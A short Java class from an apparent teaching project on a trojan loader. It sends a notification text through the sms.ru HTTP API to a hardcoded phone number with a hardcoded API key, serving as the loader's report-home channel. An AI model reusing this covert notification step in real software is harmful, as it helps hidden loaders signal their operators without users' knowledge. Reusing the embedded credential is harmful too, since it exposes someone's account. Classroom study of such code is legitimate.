package com.sbt.javaschool.rnd.lesson7trojanloader.sms;

import com.sbt.javaschool.rnd.lesson7trojanloader.loaders.TrojanLoderInformer;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URL;
import java.net.URLConnection;

public class SmsRuSender implements TrojanLoderInformer {
    @Override
    public void InformAboutLoading(String text) {
        URL yahoo = null;
        try {
            yahoo = new URL("https://sms.ru/sms/send?api_id=F65332BF-CEF2-AEDF-B0B7-E63DA07F1980&to=79508685380&msg="+text+"&json=1");
            URLConnection yc = yahoo.openConnection();
            BufferedReader in = new BufferedReader(
            new InputStreamReader(yc.getInputStream()));
            String inputLine;
            while ((inputLine = in.readLine()) != null)
                    System.out.println(inputLine);//напечатаем в консольку полученный json
            in.close();
        }
        catch (Exception e) {
            System.out.println("Чёй то не получилось отправить смс, ну а что делать, продолжаем работать");
        }
    }
}
